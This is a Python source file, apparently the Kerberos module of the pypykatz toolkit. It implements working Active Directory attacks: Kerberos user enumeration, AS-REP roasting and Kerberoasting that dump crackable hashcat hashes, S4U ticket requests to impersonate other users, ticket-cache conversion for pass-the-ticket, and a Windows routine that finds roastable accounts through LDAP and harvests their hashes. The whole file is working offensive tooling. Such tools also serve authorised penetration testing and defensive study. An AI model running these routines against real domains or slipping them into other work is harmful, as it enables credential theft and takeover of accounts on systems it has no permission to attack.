
from pypykatz import logger
import os
import ntpath
import glob
import pprint
import platform
import datetime

from msldap.commons.url import MSLDAPURLDecoder

from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.target import KerberosTarget
from minikerberos.common.keytab import Keytab
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.utils import TGSTicket2hashcat
from minikerberos.protocol.asn1_structs import AP_REQ, TGS_REQ
from minikerberos.common.utils import print_table
from minikerberos.common.ccache import CCACHE, Credential
from minikerberos.protocol.asn1_structs import KRBCRED


def process_target_line(target, realm = None, to_spn = True):
	spn = KerberosSPN()
	if to_spn is False:
		spn = KerberosCredential()
	line = target.strip()
	if line == '':
		return None
	m = line.find('@')
	if m == -1:
		if realm is not None:
			spn.username = line
			spn.domain = realm
		else:
			raise Exception('User %s is missing realm specification and no global realm is defined!' % line)
					
	else:
		spn.username, spn.domain = line.split('@',1)
		if realm is not None:
			spn.domain = realm

	return spn

def generate_targets(targets, realm = None, to_spn = True):
	"""
	Takes a list of files or strings and generates a list of targets in <username>@<realm> format
	"""
	for target in targets:
		target = target.strip()
		try:
			open(target, 'r')
		except:
			x = process_target_line(target, realm = realm, to_spn = to_spn)
			if x:
				yield x
		else:
			with open(target, 'r') as f:
				for line in f:
					x = process_target_line(line, realm = realm, to_spn = to_spn)
					if x:
						yield x

def process_keytab(keytablfile):
	with open(keytablfile, 'rb') as f:
		kt = Keytab.from_bytes(f.read())
		print(str(kt))

def list_ccache(ccachefile):
	cc = CCACHE.from_file(ccachefile)
	table = []
	table.append(['id'] + Credential.summary_header())
	i = 0
	for cred in cc.credentials:
		table.append([str(i)] + cred.summary())
		i += 1
	print()	#this line intentionally left blank
	print_table(table)

def roast_ccache(ccachefile, outfile = None):
	cc = CCACHE.from_file(ccachefile)
	if outfile:
		with open(outfile, 'wb') as f:
			for h in cc.get_hashes(all_hashes = True):
				f.write(h.encode() + b'\r\n')
	else:
		for h in cc.get_hashes(all_hashes = True):
			print(h)

def del_ccache(ccachefile, index):
	output_filename = os.path.join(os.path.dirname(os.path.abspath(ccachefile)), '%s.edited.ccache' % ntpath.basename(ccachefile)) #sorry for this, im tired now :(
	cc = CCACHE.from_file(ccachefile)
	temp_cc = CCACHE()
	temp_cc.file_format_version = cc.file_format_version
	temp_cc.headerlen = cc.headerlen
	temp_cc.headers = cc.headers
	temp_cc.primary_principal = cc.primary_principal

	for i, cred in enumerate(cc.credentials):
		if i == index:
			continue
			
		temp_cc.credentials.append(cred)

	logger.info('Writing edited file to %s' % output_filename)
	temp_cc.to_file(output_filename)

def ccache_to_kirbi(ccachefile, kirbidir):
	cc = CCACHE.from_file(ccachefile)
	logger.info('Extracting kirbi file(s)')
	cc.to_kirbidir(kirbidir)
	logger.info('Done!')

def kirbi_to_ccache(ccachefile, kirbi):
	try:
		cc = CCACHE.from_file(ccachefile)
	except FileNotFoundError:
		cc = CCACHE()
	
	abs_path = os.path.abspath(kirbi)
	if os.path.isdir(abs_path):
		logger.info('Parsing kirbi files in directory %s' % abs_path)
		for kirbifile in glob.glob(kirbi + '*.kirbi'):
			cc.add_kirbi(kirbifile)
	else:
		cc.add_kirbi(kirbi)
	
	cc.to_file(ccachefile)

def parse_kirbi(kirbifile):
	with open(kirbifile) as f:
		kirbi = KRBCRED.load(f.read())

	pp = pprint.PrettyPrinter(indent=4)
	pp.pprint(kirbi.native)

async def get_TGS(url, spn, out_file = None):
	try:
		logger.debug('[KERBEROS][TGS] started')
		ku = KerberosClientURL.from_url(url)
		cred = ku.get_creds()
		target = ku.get_target()
		spn = KerberosSPN.from_user_email(spn)

		logger.debug('[KERBEROS][TGS] target user: %s' % spn.get_formatted_pname())
		logger.debug('[KERBEROS][TGS] fetching TGT')
		kcomm = AIOKerberosClient(cred, target)
		await kcomm.get_TGT()
		logger.debug('[KERBEROS][TGS] fetching TGS')
		tgs, encTGSRepPart, key = await kcomm.get_TGS(spn)
			
		if out_file is not None:
			kcomm.ccache.to_file(out_file)
		logger.debug('[KERBEROS][TGS] done!')
		return tgs, encTGSRepPart, key, None
	except Exception as e:
		return None, None, None, e

async def get_TGT(url, out_file = None):
	try:
		logger.debug('[KERBEROS][TGT] started')
		ku = KerberosClientURL.from_url(url)
		cred = ku.get_creds()
		target = ku.get_target()

		logger.debug('[KERBEROS][TGT] cred: %s' % cred)
		logger.debug('[KERBEROS][TGT] target: %s' % target)

		kcomm = AIOKerberosClient(cred, target)
		logger.debug('[KERBEROS][TGT] fetching TGT')
		await kcomm.get_TGT()
		
		if out_file is not None:
			kcomm.ccache.to_file(out_file)
			logger.debug('[KERBEROS][TGT] Done! TGT stored in CCACHE file')
		
		return kcomm.kerberos_TGT, kcomm.kerberos_TGT_encpart, None
	except Exception as e:
		return None, None, e

async def brute(host, targets, out_file = None, show_negatives = False):
	"""
	targets List<KerberosSPN>

	"""
	try:
		logger.debug('[KERBEROS][BRUTE] User enumeration starting')
		target = KerberosTarget(host)

		for spn in targets:
			ke = KerberosUserEnum(target, spn)
			
			result = await ke.run()
			if result is True:
				if out_file:
					with open(out_file, 'a') as f:
							f.write(result + '\r\n')
				else:
					print('[+] %s' % str(spn))
			else:
				if show_negatives is True:
					print('[-] %s' % str(spn))

		logger.info('[KERBEROS][BRUTE] User enumeration finished')
		return None, None
	except Exception as e:
		return None, e


async def asreproast(host, targets, out_file = None, etype = 23):
	"""
	targets List<KerberosSPN>

	"""
	try:
		logger.debug('[KERBEROS][ASREPROAST] Roasting...')
		logger.debug('[KERBEROS][ASREPROAST] Supporting the following encryption type: %s' % (str(etype)))

		ks = KerberosTarget(host)
		ar = APREPRoast(ks)
		hashes = []
		for target in targets:
			h = await ar.run(target, override_etype = [etype])
			hashes.append(h)

			if out_file:
				with open(out_file, 'a', newline = '') as f:
					for thash in hashes:
						f.write(thash + '\r\n')
			else:
				print(h)

		logger.info('[KERBEROS][ASREPROAST] Done!')
		return hashes, None
		
	except Exception as e:
		return None, e

async def spnroast(url, targets, out_file = None, etype = 23):
	"""
	targets List<KerberosSPN>

	"""
	try:
		logger.debug('[KERBEROS][SPNROAST] Roasting...')
		if etype:
			if etype == -1:
				etypes = [23, 17, 18]
			else:
				etypes = [etype]
		else:
			etypes = [23, 17, 18]

		logger.debug('[KERBEROS][SPNROAST] Using the following encryption type(s): %s' % (','.join(str(x) for x in etypes)))
		
		ku = KerberosClientURL.from_url(url)
		cred = ku.get_creds()
		target = ku.get_target()
		ar = Kerberoast(target, cred)
		hashes = await ar.run(targets, override_etype = etypes)

		if out_file:
			with open(out_file, 'w', newline = '') as f:
				for thash in hashes:
					f.write(thash + '\r\n')

		else:
			for thash in hashes:
				print(thash)

		logger.info('[KERBEROS][SPNROAST] Done!')
		return hashes, None
		
	except Exception as e:
		return None, e

async def s4u(url, spn, targetuser, out_file = None):
	try:
		logger.debug('[KERBEROS][S4U] Started')
		cu = KerberosClientURL.from_url(url)
		ccred = cu.get_creds()
		target = cu.get_target()

		service_spn = KerberosSPN.from_target_string(spn)
		target_user = KerberosSPN.from_user_email(targetuser)
			
		if not ccred.ccache:
			logger.debug('[KERBEROS][S4U] Getting TGT')
			client = AIOKerberosClient(ccred, target)
			await client.get_TGT()
			logger.debug('[KERBEROS][S4U] Getting ST')
			tgs, encTGSRepPart, key = await client.getST(target_user, service_spn)
		else:
			logger.debug('[KERBEROS][S4U] Getting TGS via TGT from CCACHE')
			for tgt, key in ccred.ccache.get_all_tgt():
				try:
					logger.debug('[KERBEROS][S4U] Trying to get SPN with %s' % '!'.join(tgt['cname']['name-string']))
					client = AIOKerberosClient.from_tgt(target, tgt, key)

					tgs, encTGSRepPart, key = await client.getST(target_user, service_spn)
					logger.debug('[KERBEROS][S4U] Sucsess!')
				except Exception as e:
					logger.debug('[KERBEROS][S4U] This ticket is not usable it seems Reason: %s' % e)
					continue
				else:
					break

		if out_file:
			client.ccache.to_file(out_file)

		logger.debug('[KERBEROS][S4U] Done!')
		return tgs, encTGSRepPart, key, None

	except Exception as e:
		return None, None, None, e

async def live_roast(outfile = None):
	try:
		if platform.system() != 'Windows':
			print('[-]This command only works on Windows!')
			return
		try:
			from winsspi.sspi import KerberoastSSPI
		except ImportError:
			raise Exception('winsspi module not installed!')

		from winacl.functions.highlevel import get_logon_info
		
		logon = get_logon_info()
		domain = logon['domain']
		url = 'ldap+sspi-ntlm://%s' % logon['logonserver']
		msldap_url = MSLDAPURLDecoder(url)
		client = msldap_url.get_client()
		_, err = await client.connect()
		if err is not None:
			raise err

		domain = client._ldapinfo.distinguishedName.replace('DC=','').replace(',','.')
		spn_users = []
		asrep_users = []
		errors = []
		results = []
		res = []
		spn_cnt = 0
		asrep_cnt = 0
		async for user, err in client.get_all_knoreq_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
			
			asrep_users.append(cred)
		async for user, err in client.get_all_service_users():
			if err is not None:
				raise err
			cred = KerberosCredential()
			cred.username = user.sAMAccountName
			cred.domain = domain
			
			spn_users.append(cred)
			
		for cred in asrep_users:
			results = []
			ks = KerberosTarget(domain)
			ar = APREPRoast(ks)
			res = await ar.run(cred, override_etype = [23])
			results.append(res)	
		
		if outfile is not None:
			filename = outfile + 'asreproast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
			with open(filename, 'w', newline = '') as f:
					for thash in results:
						asrep_cnt += 1
						f.write(thash + '\r\n')
		else:
			res += results

		results = []
		for cred in spn_users:
			spn_name = '%s@%s' % (cred.username, cred.domain)
			if spn_name[:6] == 'krbtgt':
				continue
			ksspi = KerberoastSSPI()
			try:
				ticket = ksspi.get_ticket_for_spn(spn_name)
			except Exception as e:
				errors.append((spn_name, e))
				continue
			results.append(TGSTicket2hashcat(ticket))
		
		if outfile is not None:
			filename = outfile+ 'spnroast_%s_%s.txt' % (logon['domain'], datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"))
			with open(filename, 'w', newline = '') as f:
				for thash in results:
					spn_cnt += 1
					f.write(thash + '\r\n')
		
		else:
			res += results

		return res, errors, None

	except Exception as e:
		return None, None, e
